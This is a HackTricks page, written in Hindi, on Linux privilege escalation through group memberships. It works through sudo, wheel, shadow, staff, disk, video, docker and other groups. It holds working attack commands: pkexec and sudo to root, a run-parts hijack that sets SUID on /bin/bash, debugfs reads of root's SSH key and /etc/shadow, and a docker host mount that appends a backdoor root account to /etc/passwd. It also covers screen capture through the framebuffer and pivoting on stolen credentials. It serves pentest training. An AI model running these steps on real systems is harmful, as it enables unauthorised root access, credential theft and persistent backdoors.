# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**कभी-कभी**, **डिफ़ॉल्ट रूप से (या क्योंकि किसी software को इसकी आवश्यकता होती है)** **/etc/sudoers** फ़ाइल के अंदर आपको इनमें से कुछ lines मिल सकती हैं:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
इसका मतलब है कि **sudo या admin group से संबंधित कोई भी user sudo के रूप में कुछ भी execute कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस इसे execute कर सकते हैं**:
```
sudo su
```
### PE - Method 2

सभी suid binaries खोजें और जाँचें कि **Pkexec** binary मौजूद है या नहीं:
```bash
find / -perm -4000 2>/dev/null
```
यदि आपको पता चलता है कि binary **pkexec एक SUID binary है** और आप **sudo** या **admin** group में हैं, तो आप संभवतः `pkexec` का उपयोग करके binaries को sudo के रूप में execute कर सकते हैं।\
ऐसा इसलिए है क्योंकि आमतौर पर ये **polkit policy** के अंदर के groups होते हैं। यह policy मूल रूप से यह पहचानती है कि कौन-से groups `pkexec` का उपयोग कर सकते हैं। इसे इससे check करें:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
वहां आपको पता चलेगा कि किन groups को **pkexec** execute करने की अनुमति है और कुछ Linux distros में **by default** **sudo** और **admin** groups दिखाई देते हैं।

**root बनने के लिए आप execute कर सकते हैं**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
यदि आप **pkexec** को execute करने का प्रयास करते हैं और आपको यह **error** मिलता है:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**ऐसा इसलिए नहीं है कि आपके पास permissions नहीं हैं, बल्कि इसलिए है कि आप GUI के बिना connected नहीं हैं**। और इस समस्या के लिए एक workaround यहाँ है: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)। आपको **2 अलग-अलग ssh sessions** चाहिए:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**कभी-कभी**, **डिफ़ॉल्ट रूप से** **/etc/sudoers** फ़ाइल के अंदर आपको यह लाइन मिल सकती है:
```
%wheel	ALL=(ALL:ALL) ALL
```
इसका अर्थ है कि **wheel group से संबंधित कोई भी user sudo के रूप में कुछ भी execute कर सकता है**।

यदि ऐसा है, तो **root बनने के लिए आप बस इसे execute कर सकते हैं**:
```
sudo su
```
## Shadow Group

**group shadow** के users **/etc/shadow** file को **पढ़** सकते हैं:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
तो, file पढ़ें और कुछ **hashes crack** करने का प्रयास करें।

Hashes की triage करते समय lock-state की एक महत्वपूर्ण बात:
- `!` या `*` वाली entries आम तौर पर password logins के लिए non-interactive होती हैं।
- `!hash` का आमतौर पर अर्थ है कि password सेट किया गया था और फिर account lock कर दिया गया।
- `*` का आमतौर पर अर्थ है कि कोई valid password hash कभी सेट नहीं किया गया।
Direct login blocked होने पर भी account classification के लिए यह उपयोगी है।

## Staff Group

**staff**: Users को root privileges की आवश्यकता के बिना system (`/usr/local`) में local modifications जोड़ने की अनुमति देता है (ध्यान दें कि `/usr/local/bin` में मौजूद executables किसी भी user के `PATH` variable में होते हैं, और वे समान नाम वाले `/bin` और `/usr/bin` के executables को "override" कर सकते हैं)। इसकी तुलना group "adm" से करें, जो monitoring/security से अधिक संबंधित है। [\[source\]](https://wiki.debian.org/SystemGroups)

Debian distributions में, `$PATH` variable दिखाता है कि `/usr/local/` को सबसे high priority पर run किया जाएगा, चाहे आप privileged user हों या नहीं।
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
अगर हम `/usr/local` में कुछ programs को hijack कर सकें, तो आसानी से root प्राप्त कर सकते हैं।

`run-parts` program को hijack करना root प्राप्त करने का एक आसान तरीका है, क्योंकि अधिकांश programs `run-parts` को चलाते हैं (जैसे crontab और SSH login के समय)।
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
या जब कोई नया ssh session login करे।
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

यह privilege लगभग **root access के equivalent** है, क्योंकि आप machine के अंदर मौजूद सभी data को access कर सकते हैं।

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
ध्यान दें कि debugfs का उपयोग करके आप **फाइलें लिख** भी सकते हैं। उदाहरण के लिए `/tmp/asd1.txt` को `/tmp/asd2.txt` में कॉपी करने के लिए आप यह कर सकते हैं:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
हालांकि, यदि आप **root के स्वामित्व वाली files** (जैसे `/etc/shadow` या `/etc/passwd`) को **write** करने का प्रयास करते हैं, तो आपको "**Permission denied**" error मिलेगा।

## Video Group

`w` command का उपयोग करके आप पता लगा सकते हैं कि **system पर कौन logged on है**, और यह निम्नलिखित जैसा output दिखाएगा:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** का अर्थ है कि user **yossi मशीन के terminal में physically logged in** है।

**video group** को screen output देखने की access प्राप्त है। मूल रूप से, आप screens को observe कर सकते हैं। ऐसा करने के लिए आपको **screen पर वर्तमान image को raw data में grab** करना होगा और screen द्वारा उपयोग किए जा रहे resolution को प्राप्त करना होगा। Screen data को `/dev/fb0` में save किया जा सकता है और आप इस screen का resolution `/sys/class/graphics/fb0/virtual_size` पर पा सकते हैं.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw image** को **open** करने के लिए आप **GIMP** का उपयोग कर सकते हैं, **`screen.raw`** फ़ाइल चुनें और file type के रूप में **Raw image data** चुनें:

![Disk Group - Video Group: raw image को open करने के लिए आप GIMP का उपयोग कर सकते हैं, screen.raw फ़ाइल चुनें और file type के रूप में Raw image data चुनें](<../../../images/image (463).png>)

फिर **Width** और **Height** को screen पर उपयोग किए गए मानों में बदलें और अलग-अलग **Image Types** जाँचें (और वह चुनें जो screen को बेहतर तरीके से दिखाता हो):

![Disk Group - Video Group: फिर Width और Height को screen पर उपयोग किए गए मानों में बदलें और अलग-अलग Image Types जाँचें (और वह चुनें जो screen को बेहतर तरीके से दिखाता हो)](<../../../images/image (317).png>)

## Root Group

ऐसा लगता है कि default रूप से **members of root group** को कुछ **service** configuration files, कुछ **libraries** files या **अन्य महत्वपूर्ण चीज़ों** को **modify** करने की access मिल सकती है, जिनका उपयोग privileges escalate करने के लिए किया जा सकता है...

**जाँचें कि root members किन files को modify कर सकते हैं**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

आप **host machine के root filesystem को किसी instance के volume पर mount कर सकते हैं**, इसलिए instance शुरू होते ही वह उस volume में `chroot` लोड कर लेता है। इससे प्रभावी रूप से आपको उस machine पर root access मिल जाता है।
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
अंत में, अगर आपको पहले दिए गए सुझावों में से कोई पसंद नहीं आता, या वे किसी कारण से काम नहीं कर रहे हैं (docker api firewall?), तो आप हमेशा **एक privileged container run करके उससे escape करने** का प्रयास कर सकते हैं, जैसा कि यहां बताया गया है:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

अगर आपके पास docker socket पर write permissions हैं, तो [**docker socket का दुरुपयोग करके privileges escalate करने के तरीके वाली इस post को पढ़ें**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group


{{#ref}}
./
{{#endref}}

## Adm Group

आमतौर पर **`adm`** group के **members** के पास _/var/log/_ के अंदर स्थित **log** files को **read** करने की permissions होती हैं।\
इसलिए, अगर आपने इस group के किसी user को compromise किया है, तो आपको निश्चित रूप से **logs पर नज़र डालनी चाहिए**।

## Backup / Operator / lp / Mail groups

ये groups अक्सर direct root vectors के बजाय **credential-discovery** vectors होते हैं:
- **backup**: configs, keys, DB dumps या tokens वाले archives को expose कर सकता है।
- **operator**: platform-specific operational access, जिससे sensitive runtime data leak हो सकता है।
- **lp**: print queues/spools में document contents हो सकते हैं।
- **mail**: mail spools reset links, OTPs और internal credentials expose कर सकते हैं।

इन groups की membership को high-value data exposure finding मानें और password/token reuse के माध्यम से pivot करें।

## Auth group

OpenBSD में **auth** group आमतौर पर _**/etc/skey**_ और _**/var/db/yubikey**_ folders में write कर सकता है, यदि उनका उपयोग किया जाता है।\
इन permissions का दुरुपयोग करके निम्न exploit से root तक **privileges escalate** किए जा सकते हैं: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
